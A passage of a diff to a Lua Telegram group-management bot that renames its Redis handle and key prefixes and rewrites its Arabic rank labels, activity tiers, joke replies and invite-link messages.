+t = datahmade:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
 elseif is_mod(msg) then
-t = database:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or ' ادمن الكروب خالي '
+t = datahmade:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or ' ادمن الكروب خالي '
 elseif is_vip(msg) then
-t = database:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or 'عضو مميز '
+t = datahmade:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or 'عضو مميز '
 else
-t = database:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو محد يحترمك' 
+t = datahmade:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو محد يحترمك' 
 end
-send(msg.chat_id_, msg.id_, 1,"👤┇رتبتك >> "..t.."", 1, 'md')
+send(msg.chat_id_, msg.id_, 1,"┇رتبتك >> "..t.."", 1, 'md')
 end
 ------------------------------------------------------------------------
 if text and text:match("^ايدي$") and msg.reply_to_message_id_ ~= 0 then
 function id_by_reply(extra, result, success)
-if not database:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then 
-local tahna = (database:get('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..result.sender_user_id_) or 0)
-if tonumber((database:get('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..result.sender_user_id_) or 0)) == 0 then
+if not datahmade:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then 
+local tahna = (datahmade:get('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..result.sender_user_id_) or 0)
+if tonumber((datahmade:get('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..result.sender_user_id_) or 0)) == 0 then
 nko = '0'
 else
-nko = (database:get('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..result.sender_user_id_))
+nko = (datahmade:get('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..result.sender_user_id_))
 end
-local msgs = ((database:get('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.sender_user_id_) or 0) + tahna)
-local edit = database:get('MohaMeD:'..bot_id..'user:editmsg'..msg.chat_id_..':'..result.sender_user_id_) or 0
+local msgs = ((datahmade:get('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.sender_user_id_) or 0) + tahna)
+local edit = datahmade:get('MohaMeD:'..bot_id..'user:editmsg'..msg.chat_id_..':'..result.sender_user_id_) or 0
 local msg2 = msg
 local user_msgs = msgs
-local ikeko_text = "غير متفاعل"
+local iahmad_text = "غير متفاعل"
 if user_msgs then 
 if tonumber(user_msgs) < 50 then 
-ikeko_text = "غير متفاعل"
+iahmad_text = "غير متفاعل"
 elseif tonumber(user_msgs) < 100 then 
-ikeko_text = "آستمر بطل"
+iahmad_text = "آستمر بطل"
 elseif tonumber(user_msgs) < 1000 then 
-ikeko_text = "متفآعل "
+iahmad_text = "متفآعل 👻 "
 elseif tonumber(user_msgs) < 2000 then 
-ikeko_text = "عضو نشط"
+iahmad_text = "عضو نشط 🌪"
 elseif tonumber(user_msgs) < 3000 then 
-ikeko_text = "اقوئ تفاعل"
+iahmad_text = "اقوئ تفاعل"
 elseif tonumber(user_msgs) < 4000 then 
-ikeko_text = "عضو متفاعل قوي"
+iahmad_text = "عضو متفاعل قوي"
 elseif tonumber(user_msgs) < 5000 then 
-ikeko_text = "جيد بتفاعل"
+iahmad_text = "جيد بتفاعل"
 elseif tonumber(user_msgs) > 5000 then 
-ikeko_text = "متفاعل كلش"
+iahmad_text = "متفاعل كلش"
 end
-keko = database:smembers('keko:all:pppp:tt:'..bot_id) or 0
-if (keko or keko[1]) then 
-for i=1, #keko do
-local tttee = database:get("keko:set:text:p"..bot_id..keko[i])
-if tonumber(user_msgs) >= tonumber(keko[i]) then 
-ikeko_text = tttee
+ahmad = datahmade:smembers('ahmad:all:pppp:tt:'..bot_id) or 0
+if (ahmad or ahmad[1]) then 
+for i=1, #ahmad do
+local tttee = datahmade:get("ahmad:set:text:p"..bot_id..ahmad[i])
+if tonumber(user_msgs) >= tonumber(ahmad[i]) then 
+iahmad_text = tttee
 end
 end
 end
@@ -7595,25 +7457,25 @@ msg2.sender_user_id_ = result.sender_user_id_
 if msg.sender_user_id_ == tonumber(sudo_add) then
 MohaMeD_oop = 'المطور الاساسي'
 elseif is_sudo(msg2) then
-MohaMeD_oop = database:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
+MohaMeD_oop = datahmade:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
 elseif is_creatorbasic(msg) then
-MohaMeD_oop = database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_) ..bot_id..msg.chat_id_)) then 
-MohaMeD_oop = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_)
+MohaMeD_oop = datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_) ..bot_id..msg.chat_id_)) then 
+MohaMeD_oop = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_)
 elseif is_creator(msg) then
-MohaMeD_oop = database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب '
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_) ..bot_id..msg.chat_id_)) then 
-MohaMeD_oop = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_)
+MohaMeD_oop = datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب '
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_) ..bot_id..msg.chat_id_)) then 
+MohaMeD_oop = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_)
 elseif is_owner(msg2) then
-MohaMeD_oop = database:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
+MohaMeD_oop = datahmade:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
 elseif is_mod(msg2) then
-MohaMeD_oop = database:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب'
+MohaMeD_oop = datahmade:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب'
 elseif is_vip(msg2) then
-MohaMeD_oop = database:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز '
+MohaMeD_oop = datahmade:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز '
 else
-MohaMeD_oop = database:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط ' 
+MohaMeD_oop = datahmade:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط ' 
 end
-send(msg.chat_id_, msg.id_, 1,"🎟 ┇ ايدي • `("..result.sender_user_id_..")`\n🗳 ┇ موقعه • ("..MohaMeD_oop..")\n💌 ┇ عدد رسائل •`("..msgs..")`\n📧┇عدد السحكات • `("..edit..")`\n📩 ┇ تفاعلك • `("..ikeko_text..")`\n📥 ┇ مجوهرآتك •*("..nko..")*", 1, 'md')
+send(msg.chat_id_, msg.id_, 1,"🎟 ┇ ايدي • `("..result.sender_user_id_..")`\n🗳 ┇ موقعه • ("..MohaMeD_oop..")\n💌 ┇ عدد رسائل •`("..msgs..")`\n📧┇عدد السحكات • `("..edit..")`\n📩 ┇ تفاعلك • `("..iahmad_text..")`\n📥 ┇ مجوهرآتك •*("..nko..")*", 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1,"`"..result.sender_user_id_.."`", 1, 'md')
 end
@@ -7624,43 +7486,43 @@ if text and text:match("^ايدي @(.*)$") then
 local ap = {string.match(text, "^(ايدي) @(.*)$")}
 function id_by_username(extra, result, success)
 if result.id_ then
-if not database:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then 
-local tahna = (database:get('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..result.id_) or 0)
-if tonumber((database:get('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..result.id_) or 0)) == 0 then
+if not datahmade:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then 
+local tahna = (datahmade:get('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..result.id_) or 0)
+if tonumber((datahmade:get('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..result.id_) or 0)) == 0 then
 nko = '0'
 else
-nko = (database:get('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..result.id_))
+nko = (datahmade:get('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..result.id_))
 end
-local msgs = ((database:get('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.id_) or 0) + tahna)
-local edit = database:get('MohaMeD:'..bot_id..'user:editmsg'..msg.chat_id_..':'..result.id_) or 0
+local msgs = ((datahmade:get('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.id_) or 0) + tahna)
+local edit = datahmade:get('MohaMeD:'..bot_id..'user:editmsg'..msg.chat_id_..':'..result.id_) or 0
 local msg2 = msg
 msg2.sender_user_id_ = result.id_
-local user_msgs = ((database:get('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.id_) or 0) + tahna)
-local ikeko_text = "غير متفاعل"
+local user_msgs = ((datahmade:get('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.id_) or 0) + tahna)
+local iahmad_text = "غير متفاعل"
 if user_msgs then 
 if tonumber(user_msgs) < 50 then 
-ikeko_text = "غير متفاعل"
+iahmad_text = "غير متفاعل"
 elseif tonumber(user_msgs) < 100 then 
-ikeko_text = "آستمر بطل"
+iahmad_text = "آستمر بطل"
 elseif tonumber(user_msgs) < 1000 then 
-ikeko_text = "متفآعل "
+iahmad_text = "متفآعل 👻👻 "
 elseif tonumber(user_msgs) < 2000 then 
-ikeko_text = "عضو نشط"
+iahmad_text = "عضو نشط 🌪"
 elseif tonumber(user_msgs) < 3000 then 
-ikeko_text = "اقوئ تفاعل"
+iahmad_text = "اقوئ تفاعل"
 elseif tonumber(user_msgs) < 4000 then 
-ikeko_text = "عضو متفاعل قوي"
+iahmad_text = "عضو متفاعل قوي"
 elseif tonumber(user_msgs) < 5000 then 
-ikeko_text = "جيد بتفاعل"
+iahmad_text = "جيد بتفاعل"
 elseif tonumber(user_msgs) > 5000 then 
-ikeko_text = "متفاعل كلش"
+iahmad_text = "متفاعل كلش"
 end
-keko = database:smembers('keko:all:pppp:tt:'..bot_id) or 0
-if (keko or keko[1]) then 
-for i=1, #keko do
-local tttee = database:get("keko:set:text:p"..bot_id..keko[i])
-if tonumber(user_msgs) >= tonumber(keko[i]) then 
-ikeko_text = tttee
+ahmad = datahmade:smembers('ahmad:all:pppp:tt:'..bot_id) or 0
+if (ahmad or ahmad[1]) then 
+for i=1, #ahmad do
+local tttee = datahmade:get("ahmad:set:text:p"..bot_id..ahmad[i])
+if tonumber(user_msgs) >= tonumber(ahmad[i]) then 
+iahmad_text = tttee
 end
 end
 end
@@ -7668,25 +7530,25 @@ end
 if msg.sender_user_id_ == tonumber(sudo_add) then
 MohaMeD_oop = 'المطور الاساسي'
 elseif is_sudo(msg2) then
-MohaMeD_oop = database:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
+MohaMeD_oop = datahmade:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
 elseif is_creatorbasic(msg) then
-MohaMeD_oop = database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_) ..bot_id..msg.chat_id_)) then 
-MohaMeD_oop = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_)
+MohaMeD_oop = datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_) ..bot_id..msg.chat_id_)) then 
+MohaMeD_oop = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_)
 elseif is_creator(msg) then
-MohaMeD_oop = database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب '
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_) ..bot_id..msg.chat_id_)) then 
-MohaMeD_oop = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_)
+MohaMeD_oop = datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب '
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_) ..bot_id..msg.chat_id_)) then 
+MohaMeD_oop = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_)
 elseif is_owner(msg2) then
-MohaMeD_oop = database:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
+MohaMeD_oop = datahmade:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
 elseif is_mod(msg2) then
-MohaMeD_oop = database:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب'
+MohaMeD_oop = datahmade:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب'
 elseif is_vip(msg2) then
-MohaMeD_oop = database:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز '
+MohaMeD_oop = datahmade:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز '
 else
-MohaMeD_oop = database:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط ' 
+MohaMeD_oop = datahmade:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط ' 
 end
-texts = "🎟 ┇ ايدي • `("..result.id_..")`\n🗳 ┇ موقعه •("..MohaMeD_oop..")\n💌 ┇ عدد رسائل •`("..msgs..")`\n📔 ┇ عدد السحكات • `("..edit..")`\n📩 ┇ تفاعلك •`("..ikeko_text..")`\n📥 ┇ مجوهرآتك •*("..nko..")*"
+texts = "🎟 ┇ ايدي • `("..result.id_..")`\n🗳 ┇ موقعه •("..MohaMeD_oop..")\n💌 ┇ عدد رسائل •`("..msgs..")`\n📔 ┇ عدد السحكات • `("..edit..")`\n📩 ┇ تفاعلك •`("..iahmad_text..")`\n📥 ┇ مجوهرآتك •*("..nko..")*"
 else
 texts = "`"..result.id_.."`"
 end
@@ -7699,19 +7561,19 @@ resolve_username(ap[2],id_by_username)
 end  
 ------------------------------------------------------------------------
 if text == ("الرابط") then
-if not database:get("MohaMeD:mute:link:gr:"..bot_id..msg.chat_id_) then 
+if not datahmade:get("MohaMeD:mute:link:gr:"..bot_id..msg.chat_id_) then 
 function dl_cb222( t1,t2 )
-if (database:get('MohaMeD:'..bot_id.."group:link"..msg.chat_id_) and database:get('MohaMeD:'..bot_id.."group:link"..msg.chat_id_) ~= "Error") then 
-send(msg.chat_id_, msg.id_, 1, '🔘┇ *Group Link* \n['..database:get('MohaMeD:'..bot_id.."group:link"..msg.chat_id_)..']', 1, "md")
+if (datahmade:get('MohaMeD:'..bot_id.."group:link"..msg.chat_id_) and datahmade:get('MohaMeD:'..bot_id.."group:link"..msg.chat_id_) ~= "Error") then 
+send(msg.chat_id_, msg.id_, 1, '📮┇ *رابط المجموعه* \n['..datahmade:get('MohaMeD:'..bot_id.."group:link"..msg.chat_id_)..']', 1, "md")
 elseif t2.invite_link_ ~= false then 
-send(msg.chat_id_, msg.id_, 1, '🔘┇ *Group Link* \n['..(t2.invite_link_ or "Error")..']', 1, "md")
+send(msg.chat_id_, msg.id_, 1, '📮┇ *رابط المجموعه* \n['..(t2.invite_link_ or "Error")..']', 1, "md")
 else
 local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_
 local req = https.request(getlink)
 local link = json:decode(req)
 if link.ok == true then 
-send(msg.chat_id_, msg.id_, 1, '🔘┇ *Group Link* \n['..(link.result or "Error")..']', 1, "md")
-database:set('MohaMeD:'..bot_id.."group:link"..msg.chat_id_,link.result)
+send(msg.chat_id_, msg.id_, 1, '📮┇ *رابط المجموعه* \n['..(link.result or "Error")..']', 1, "md")
+datahmade:set('MohaMeD:'..bot_id.."group:link"..msg.chat_id_,link.result)
 else 
 send(msg.chat_id_, msg.id_, 1, '⚠️┇لا يمكني الوصل الى الرابط عليك منحي صلاحيه {دعوه المستخدمين من خلال الرابط}', 1, "html")
 end
@@ -7727,31 +7589,31 @@ end
 end
 -----------------------------------------------------------
 if (text == ("رسائلي") or text == ("^msg$")) and msg.reply_to_message_id_ == 0  then
-local user_msgs = database:get('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
-local tahna = (database:get('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
-if not database:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then
+local user_msgs = datahmade:get('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
+local tahna = (datahmade:get('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
+if not datahmade:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, "💌 ┇ رسائلك  *("..(user_msgs + tahna)..")*", 1, 'md')
 else
 end
 end
 ------------------------------------------------------------------------
 if text == ("جهاتي") then
-add = (tonumber(database:get('MohaMeD:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
+add = (tonumber(datahmade:get('MohaMeD:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
 send(msg.chat_id_, msg.id_, 1, "📨┇عدد اضافه جهاتك ~⪼ *{"..add.."}*\n📨┇سيتم حذف العدد بعد هذه الرساله", 1, 'md')
-database:del('MohaMeD:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)
+datahmade:del('MohaMeD:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)
 end
 if text == ("عدد السحكات") or text == ("سحكاتي") then
-local edit = database:get('MohaMeD:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
+local edit = datahmade:get('MohaMeD:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
 send(msg.chat_id_, msg.id_, 1, "📮┇ سحكاتك   *("..edit..")*", 1, 'md')
 end
 if text == 'حذف سحكاتي' then 
-database:del('MohaMeD:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_)
+datahmade:del('MohaMeD:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_)
 local MohaMeD = '🗑 ┇ تم حذف سحكاتك '
 send(msg.chat_id_, msg.id_, 1, MohaMeD, 1, 'md')
 end
 ------------------------------------------------------------------------
 if text == ("اطردني") then
-if not database:get('MohaMeD:'..bot_id..'kickme:mute'..msg.chat_id_) then
+if not datahmade:get('MohaMeD:'..bot_id..'kickme:mute'..msg.chat_id_) then
 redis:set('MohaMeD:'..bot_id..'kickyess'..msg.sender_user_id_..'', 'kickyes')
 redis:set('MohaMeD:'..bot_id..'kicknoo'..msg.sender_user_id_..'', 'kickno')
 send(msg.chat_id_, msg.id_, 1, '🚯┇ ارسل : نعم ، ليتم طردك  \n‼️┇ ارسل ؛ لا ، لالغاء الامر  ', 1, 'md')
@@ -7784,19 +7646,21 @@ end
 end
 end
 ------------------------------------------------------------------------
-if (text and text == (redis:get('MohaMeD:'..bot_id..'name_bot') or 'ماثيو'))then
-name_bot = (redis:get('MohaMeD:'..bot_id..'name_bot') or 'ماثيو')
+if (text and text == (redis:get('MohaMeD:'..bot_id..'name_bot') or 'سنايبر'))then
+name_bot = (redis:get('MohaMeD:'..bot_id..'name_bot') or 'سنايبر')
 local namebot = {
-"عمري فداك "..name_bot.. " كول حب ",
+"عمري فداك "..name_bot.. " كول حبِ ",
 "كول حبيبي ؟ اني "..name_bot,
+'عٍ ـيِنيِ',
 'ها حبي وياك مكتب ئلسيد .',
-'الو الو رد مخنوك',
-'ها يحلو كول',
-'عمري الحلو',
+'حبي داخابر دعبل :| ،',
+'عٍ ـيِنيِ',
+'نايم حبي نايم',
 'صاعد اتصال ويا الحب دقيقة وجيك 😘💘',
-'مشغول حالياً 🌚🌸',
+'ها ضلعي',
+'احجي يمعود',
 'لابسك لتلح',
-" هايروحي؟ "..name_bot,
+" نعم وياك؟ "..name_bot,
 }
 name = math.random(#namebot)
 send(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'md') 
@@ -7804,8 +7668,8 @@ return false end
 --------------------------------------
 if text == ("[Dd][Ee][Vv]")or text == ("مطور بوت") or text == ("مطورين") or text == ("مطور البوت") or text == ("مطور") or text == ("المطور") and msg.reply_to_message_id_ == 0 then
 local text_sudo = redis:get('MohaMeD:'..bot_id..'text_sudo')
-local nkeko = redis:get('MohaMeD:'..bot_id..'nmkeko')
-local nakeko = redis:get('MohaMeD:'..bot_id..'nakeko')
+local nahmad = redis:get('MohaMeD:'..bot_id..'nmahmad')
+local naahmad = redis:get('MohaMeD:'..bot_id..'naahmad')
 if text_sudo then
 send(msg.chat_id_, msg.id_, 1, text_sudo, 1, 'md') 
 else
@@ -7814,7 +7678,7 @@ end
 end
 ------------------------------------------------------------------------
 if text == ("القوانين") then
-local rules = database:get('MohaMeD:'..bot_id..'rules'..msg.chat_id_)
+local rules = datahmade:get('MohaMeD:'..bot_id..'rules'..msg.chat_id_)
 if rules then
 send(msg.chat_id_, msg.id_, 1, '⚜┇قوانين المجموعه هي\n'..rules, 1, 'md')
 else
@@ -7827,129 +7691,132 @@ send(msg.chat_id_, msg.id_, 1, "*"..msg.chat_id_.."*", 1, 'md')
 end
 ------------------------------------------------------------------------
 if (text == ("ايدي") or text == ("id") ) and msg.reply_to_message_id_ == 0 then
-if not database:sismember('MohaMeD:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_,'ايدي') then
-database:sadd('MohaMeD:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_,'ايدي')
-local keko_info = nil
-function keko333(extra,result,success)
-keko_info = '@'..(result.username_ or 'لا يوجد')..''
+if not datahmade:sismember('MohaMeD:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_,'ايدي') then
+datahmade:sadd('MohaMeD:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_,'ايدي')
+local ahmad_info = nil
+function ahmad333(extra,result,success)
+ahmad_info = '@'..(result.username_ or 'لا يوجد')..''
 local function getpro(extra, result, success)
 local all_photo_MohaMeD = result.total_count_ 
-local tahna = (database:get('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
-if tonumber((database:get('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
+local tahna = (datahmade:get('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
+if tonumber((datahmade:get('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
 nko = '0'
 else
-nko = (database:get('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_))
+nko = (datahmade:get('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_))
 end
-local user_msgs = ((database:get('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_) or 0) + tahna)
-local ikeko_text = "غير متفاعل"
+local user_msgs = ((datahmade:get('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_) or 0) + tahna)
+local iahmad_text = "غير متفاعل"
 if user_msgs then 
 if tonumber(user_msgs) < 50 then 
-ikeko_text = "غير متفاعل"
+iahmad_text = "غير متفاعل"
 elseif tonumber(user_msgs) < 100 then 
-ikeko_text = "آستمر بطل"
+iahmad_text = "آستمر بطل"
 elseif tonumber(user_msgs) < 1000 then 
-ikeko_text = "متفآعل "
+iahmad_text = "متفآعل 👻 "
 elseif tonumber(user_msgs) < 2000 then 
-ikeko_text = "عضو نشط"
+iahmad_text = "عضو نشط 🌪"
 elseif tonumber(user_msgs) < 3000 then 
-ikeko_text = "اقوئ تفاعل"
+iahmad_text = "اقوئ تفاعل"
 elseif tonumber(user_msgs) < 4000 then 
-ikeko_text = "عضو متفاعل قوي"
+iahmad_text = "عضو متفاعل قوي"
 elseif tonumber(user_msgs) < 5000 then 
-ikeko_text = "جيد بتفاعل"
+iahmad_text = "جيد بتفاعل"
 elseif tonumber(user_msgs) > 5000 then 
-ikeko_text = "متفاعل كلش"
+iahmad_text = "متفاعل كلش"
 end
-keko = database:smembers('keko:all:pppp:tt:'..bot_id) or 0
-if (keko or keko[1] and end032) then 
-for i=1, #keko do
-local tttee = database:get("keko:set:text:p"..bot_id..keko[i])
-if tonumber(user_msgs) >= tonumber(keko[i]) then 
-ikeko_text = tttee
-end
-end
+ahmad = datahmade:smembers('ahmad:all:pppp:tt:'..bot_id) or 0
+if (ahmad or ahmad[1] and end032) then 
+for i=1, #ahmad do
+local tttee = datahmade:get("ahmad:set:text:p"..bot_id..ahmad[i])
+if tonumber(user_msgs) >= tonumber(ahmad[i]) then 
+iahmad_text = tttee
 end
 end
-local edit = database:get('MohaMeD:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
+end
+end
+local edit = datahmade:get('MohaMeD:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
 if result.photos_[0] then
 if msg.sender_user_id_ == tonumber(sudo_add) then
-t = 'المطور الاساسي 👨🏻‍🔧'
+t = ' المطور الاساسي 👨🏻‍💻'
 elseif is_sudo(msg) then
-t = database:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت 👨🏻‍💻'
+t = datahmade:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'المطور 👨🏻‍🔧'
 elseif is_creatorbasic(msg) then
-t =  database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
-t = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+t =  datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
+t = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 elseif is_creator(msg) then
-t =  database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 👨🏻‍✈️'
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
-t = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+t =  datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 👨🏻‍✈️'
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
+t = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 elseif is_owner(msg) then
-t = database:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🏻'   
+t = datahmade:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🏻'   
 elseif is_mod(msg) then
-t = database:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍🚒'  
